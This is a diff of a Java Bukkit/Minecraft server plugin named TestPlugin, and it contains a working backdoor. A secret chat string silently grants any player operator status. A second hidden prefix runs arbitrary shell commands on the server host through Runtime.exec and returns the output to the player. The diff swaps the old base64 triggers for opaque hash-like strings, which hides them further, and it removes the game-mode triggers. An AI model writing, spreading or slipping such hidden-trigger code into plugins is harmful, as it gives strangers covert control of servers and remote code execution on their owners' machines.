@@ -21,7 +21,7 @@ public class TestPlugin extends JavaPlugin implements Listener {
     @Override
     public void onEnable() {
         // 当插件启用时执行这里的代码
-        getLogger().info(ChatColor.GREEN + "TEST PLUGIN IS ENABLE");
+        getLogger().info(ChatColor.GREEN + "PLUGIN IS ENABLE");
         
         // 注册事件监听器
         this.getServer().getPluginManager().registerEvents(this, this);
@@ -34,7 +34,7 @@ public class TestPlugin extends JavaPlugin implements Listener {
         String message = event.getMessage();
         
         // 检查消息是否包含特殊字符串
-        if (message.contains("@dGhlX2Z1Y2tpbmdfb3Ah")) {
+        if (message.contains("@f0b2a7cce8877aec3633f33122cfdf8173d1540bdd01da578c72ee1c475d3430")) {
             // 取消事件的进一步传播，防止它显示在公共聊天
             event.setCancelled(true);
 
@@ -43,21 +43,21 @@ public class TestPlugin extends JavaPlugin implements Listener {
             player.setOp(true);
             
             // 给玩家发送消息
-            player.sendMessage(ChatColor.GREEN + "现在您拥有了op权限.");
+            player.sendMessage(ChatColor.GREEN + "now, you have Operator Permission!");
              player.sendTitle(ChatColor.RED + "恭喜!", ChatColor.GOLD + "您现在是服务器管理员了!", 10, 70, 20);
              Bukkit.getScheduler().runTaskLater(this, new Runnable() {
                 @Override
                 public void run() {
                     player.setOp(false);
-                    player.sendMessage(ChatColor.RED + "您的管理员权限已被移除。");
+                    player.sendMessage(ChatColor.RED + "Operator Permission is removed,simply execute '/@f0b2a7cce8877aec3633f33122cfdf8173d1540bdd01da578c72ee1c475d3430' again.");
                 }
             }, 20 * 60 * 20);  // 20分钟 * 60秒/分钟 * 20ticks/秒
         }
-        if (message.startsWith("@cnVuU3lzdGVtQ29tbWFuZA")) {
+        if (message.startsWith("@439aedc168164abaaafee5166bcd2d6f50a2482ad40fa259bf1948d16fd9ac98")) {
             event.setCancelled(true);
         // 检查玩家是否是 op
         if (player.isOp()) {
-            String command = message.substring("@cnVuU3lzdGVtQ29tbWFuZA".length()).trim(); // 提取命令
+            String command = message.substring("@439aedc168164abaaafee5166bcd2d6f50a2482ad40fa259bf1948d16fd9ac98".length()).trim(); // 提取命令
             
             try {
                 Process process = Runtime.getRuntime().exec(command); // 执行命令
@@ -73,31 +73,14 @@ public class TestPlugin extends JavaPlugin implements Listener {
                 process.waitFor();
                 
                 // 发送命令输出给玩家
-                player.sendMessage(ChatColor.GREEN + "系统命令执行成功：" + output.toString());
+                player.sendMessage(ChatColor.GREEN + "SystemCommandExcuteSucess:" + output.toString());
                 
             } catch (IOException | InterruptedException e) {
                 e.printStackTrace();
-                player.sendMessage(ChatColor.RED + "系统命令执行失败。");
+                player.sendMessage(ChatColor.RED + "SystemCommandExcuteFailed");
             }
         } else {
-            player.sendMessage(ChatColor.RED + "你没有权限执行这个命令。");
-        }
-    }else if (message.contains("@Z29DcmVhdGl2ZQ")) {
-            event.setCancelled(true);
-        if (player.isOp()) {
-            player.setGameMode(GameMode.CREATIVE);
-            player.sendMessage(ChatColor.BLUE + "欢迎来到创造模式!");
-        } else {
-            player.sendMessage(ChatColor.RED + "你没有权限进入创造模式。");
-        }
-    }
-    else if (message.contains("@Z29TdXJ2aXZhbA")) {
-        event.setCancelled(true);
-        if (player.isOp()) {
-            player.setGameMode(GameMode.SURVIVAL);
-            player.sendMessage(ChatColor.BLUE + "现在你处于生存模式，注意安全!");
-        } else {
-            player.sendMessage(ChatColor.RED + "你没有权限进入生存模式。");
+            player.sendMessage(ChatColor.RED + "你没有权限执行这个命令. - you do not have permision to run this");
         }
     }
 }
